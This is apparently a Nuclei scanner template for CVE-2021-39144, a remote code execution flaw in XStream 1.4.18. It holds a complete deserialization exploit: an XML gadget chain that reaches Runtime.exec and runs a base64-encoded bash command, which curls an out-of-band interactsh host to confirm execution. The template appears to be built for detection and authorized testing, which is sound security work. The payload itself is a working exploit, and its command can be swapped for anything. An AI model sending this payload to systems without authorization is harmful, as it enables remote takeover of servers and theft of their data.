id: CVE-2021-39144

info:
  name: XStream 1.4.18  - Remote Code Execution
  author: pwnhxl
  severity: high
  description: |
    XStream 1.4.18 is susceptible to remote code execution. An attacker can execute commands of the host by manipulating the processed input stream, thereby making it possible to obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site. Setups which followed XStream's security recommendations with an allow-list are not impacted.
  reference:
    - http://x-stream.github.io/CVE-2021-39144.html
    - https://x-stream.github.io/CVE-2021-39144.html
    - https://github.com/x-stream/xstream/security/advisories/GHSA-j9h8-phrw-h4fh
    - https://security.netapp.com/advisory/ntap-20210923-0003/
    - https://nvd.nist.gov/vuln/detail/cve-2021-39144
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 8.5
    cve-id: CVE-2021-39144
    cwe-id: CWE-94,CWE-502
    epss-score: 0.97284
  tags: cve,cve2021,xstream,deserialization,rce,kev
  metadata:
    max-request: 1

variables:
  rand: "{{rand_base(6)}}"

http:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <java.util.PriorityQueue serialization='custom'>
          <unserializable-parents/>
          <java.util.PriorityQueue>
            <default>
              <size>2</size>
            </default>
            <int>3</int>
            <dynamic-proxy>
              <interface>java.lang.Comparable</interface>
              <handler class='sun.tracing.NullProvider'>
                <active>true</active>
                <providerType>java.lang.Comparable</providerType>
                <probes>
                  <entry>
                    <method>
                      <class>java.lang.Comparable</class>
                      <name>compareTo</name>
                      <parameter-types>
                        <class>java.lang.Object</class>
                      </parameter-types>
                    </method>
                    <sun.tracing.dtrace.DTraceProbe>
                      <proxy class='java.lang.Runtime'/>
                      <implementing__method>
                        <class>java.lang.Runtime</class>
                        <name>exec</name>
                        <parameter-types>
                          <class>java.lang.String</class>
                        </parameter-types>
                      </implementing__method>
                    </sun.tracing.dtrace.DTraceProbe>
                  </entry>
                </probes>
              </handler>
            </dynamic-proxy>
            <string>/bin/bash -c {echo,{{base64("curl http://{{interactsh-url}} -H \'User-Agent: {{rand}}\'")}}}|{base64,-d}|{bash,-i}</string>
          </java.util.PriorityQueue>
        </java.util.PriorityQueue>

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"

      - type: word
        part: interactsh_request
        words:
          - "User-Agent: {{rand}}"

# Enhanced by cs on 2023/04/17
